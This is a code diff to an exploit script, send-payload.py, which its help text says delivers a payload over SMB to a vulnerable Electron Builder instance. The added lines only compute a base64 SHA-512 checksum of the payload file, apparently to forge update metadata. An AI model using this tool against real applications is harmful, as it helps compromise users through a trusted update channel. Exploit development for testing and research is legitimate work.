@@ -4,6 +4,8 @@ import sys
 import argparse
 import os
 from pathlib import Path
+import hashlib
+import base64
 
 def get_ip(interface):
     """find your IP on a given interface"""
@@ -56,6 +58,28 @@ def get_payload(args, ip, port, path):
     #get size of payload
     size = os.path.getsize(Path(payload_path))
     print("Size: " + str(size))
+
+    gen_checksum(Path(payload_path))
+
+def gen_checksum(filepath):
+    """generate a sha512 hash of the file and base64 encode it"""
+
+    #set a buffer size to hash in chunks
+    BUF_SIZE = 65536
+
+    sha512 = hashlib.sha512()
+
+    with open(filepath, 'rb') as f:
+        while True:
+            data = f.read(BUF_SIZE)
+            if not data:
+                break
+            sha512.update(data)
+
+    # b64 = base64.b64encode(sha512.encode('utf-8'))
+    b64 = base64.b64encode(sha512.digest()).decode('utf-8')
+
+    print(b64)
 
 def main():
     parser = argparse.ArgumentParser(prog="send-payload.py", description="Sends a payload to a vulnerable Electron Builder instance over SMB. If no port is provided, listens on port 9001 by default. No default option for IP address is specified.")
